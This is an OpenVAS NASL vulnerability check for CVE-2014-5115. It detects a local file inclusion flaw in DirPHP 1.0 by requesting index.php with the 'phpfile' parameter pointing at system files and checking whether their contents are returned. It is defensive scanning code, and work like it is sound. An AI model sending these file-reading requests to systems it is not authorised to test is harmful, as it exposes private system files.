###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dirphp_dir_trav_vuln.nasl 3522 2016-06-15 12:39:54Z benallard $
#
# DirPHP 'path/index.php' Local File Include Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804738");
  script_version("$Revision: 3522 $");
  script_cve_id("CVE-2014-5115");
  script_bugtraq_id(68943);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-06-15 14:39:54 +0200 (Wed, 15 Jun 2016) $");
  script_tag(name:"creation_date", value:"2014-08-11 19:18:06 +0530 (Mon, 11 Aug 2014)");
  script_name("DirPHP 'path/index.php' Local File Include Vulnerability");

  script_tag(name : "summary" , value : "This host is installed with DirPHP and is prone to local file inclusion
  vulnerability.");
  script_tag(name : "vuldetect" , value : "Send a crafted data via HTTP GET request and check whether it is able to read
  local file or not.");
  script_tag(name : "insight" , value : "Flaw is due to the index.php script not properly sanitizing user input,
  specifically absolute paths supplied via the 'phpfile' parameter.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to read arbitrary files
  on the target system.

  Impact Level: Application");
  script_tag(name : "affected" , value : "DirPHP version 1.0");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/34173");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/127642");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2014/07/dirphp-10-lfi-vulnerability.html");
  script_summary("Check if DirPHP is prone to directory traversal vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
http_port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list_unique("/", "/phpdir", "/resources", cgi_dirs(http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/index.php"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## confirm the Application
  if(">DirPHP" >< rcvRes && "Created & Maintained by Stuart Montgomery<" >< rcvRes)
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/index.php?phpfile=/" + files[file];

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:http_port, url:url, pattern:file))
      {
        report = report_vuln_url( port:http_port, url:url );
        security_message(port:http_port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);